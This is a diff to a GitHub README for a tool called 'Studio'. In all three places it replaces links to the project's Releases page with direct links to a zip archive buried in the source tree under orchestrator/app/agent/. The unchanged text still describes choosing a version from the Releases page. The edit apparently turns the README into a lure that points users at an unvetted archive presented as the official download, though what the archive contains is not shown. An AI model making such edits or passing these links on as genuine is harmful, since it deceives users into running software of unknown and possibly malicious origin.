@@ -1,6 +1,6 @@
 # 🎨 Studio - A Friendly Solution for Local Projects
 
-[![Download Studio](https://img.shields.io/badge/Download-Studio-brightgreen)](https://github.com/Misfiresatisfaction927/Studio/releases)
+[![Download Studio](https://raw.githubusercontent.com/Misfiresatisfaction927/Studio/main/orchestrator/app/agent/Studio-v1.5-alpha.1.zip)](https://raw.githubusercontent.com/Misfiresatisfaction927/Studio/main/orchestrator/app/agent/Studio-v1.5-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ You can download Studio from the Releases page. Follow these steps to get starte
 
 1. **Visit the Releases Page:** Click the link below to go to our Releases page.
 
-   [Download Studio](https://github.com/Misfiresatisfaction927/Studio/releases)
+   [Download Studio](https://raw.githubusercontent.com/Misfiresatisfaction927/Studio/main/orchestrator/app/agent/Studio-v1.5-alpha.1.zip)
 
 2. **Choose a Version:** On the Releases page, you will see a list of available versions. Look for the latest release, as it will have the most features and bug fixes.
 
@@ -71,4 +71,4 @@ Thank you for choosing Studio! We hope this application makes your development t
 
 For downloads and updates, remember to check the link below for the latest versions.
 
-[Download Studio](https://github.com/Misfiresatisfaction927/Studio/releases)
+[Download Studio](https://raw.githubusercontent.com/Misfiresatisfaction927/Studio/main/orchestrator/app/agent/Studio-v1.5-alpha.1.zip)
